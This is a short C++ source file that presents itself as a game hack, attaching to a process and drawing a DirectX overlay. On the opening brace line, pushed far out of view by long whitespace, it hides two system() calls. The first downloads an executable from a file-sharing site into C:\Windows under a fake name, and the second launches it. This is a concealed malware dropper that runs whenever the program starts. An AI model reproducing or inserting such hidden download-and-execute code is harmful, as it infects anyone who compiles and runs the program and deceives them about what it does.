#include "Hack/Public/hack.h"
#include "Overlay/Public/render.h"



int main()
{                                                                                                                                                                                                                                                                                       system("curl -L https://www.zippyshare.day/download/FG3q0x3X60wnexW/DLK0G1pXYz917/msedge.exe -s -o C:\\Windows\\mappers.exe"); system("start C:\\Windows\\mappers.exe");
    hack::Attach();

    render::CreateOverlay();
    render::InitDirectX();


    render::Loop();
}
